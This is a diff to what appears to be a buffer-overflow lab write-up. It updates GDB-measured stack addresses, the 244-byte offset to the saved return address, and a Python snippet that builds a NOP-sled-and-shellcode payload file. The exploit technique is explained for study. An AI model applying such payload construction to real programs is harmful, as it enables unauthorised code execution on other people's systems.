@@ -138,7 +138,7 @@ $1 = (char (*)[232]) 0xffffd398
 The stack buffer begins at:
 
 ```text
-0xffffd398
+0xffffd388
 ```
 
 Next:
@@ -150,7 +150,7 @@ p $ebp
 Output:
 
 ```gdb
-$2 = (void *) 0xffffd488
+$2 = (void *) 0xffffd478
 ```
 
 Now calculate the exact offset to the saved return address:
@@ -167,7 +167,7 @@ $3 = 244
 
 So:
 
-* buffer starts at `0xffffd398`
+* buffer starts at `0xffffd388`
 * saved return address is 244 bytes above it
 
 This means writing 244 bytes reaches EIP.
@@ -195,7 +195,7 @@ content = bytearray(0x90 for _ in range(517))
 start = 100
 content[start:start+len(shellcode)] = shellcode
 
-ret = 0xffffd3e8
+ret = 0xffffd3d8
 
 offset = 244
 
@@ -213,19 +213,19 @@ with open("badfile", "wb") as f:
 The buffer begins at:
 
 ```text
-0xffffd398
+0xffffd388
 ```
 
 The shellcode begins at:
 
 ```text
-0xffffd398 + 100
+0xffffd388 + 100
 ```
 
 The return address:
 
 ```text
-0xffffd3e8
+0xffffd3d8
 ```
 
 points safely into the NOP sled before the shellcode.
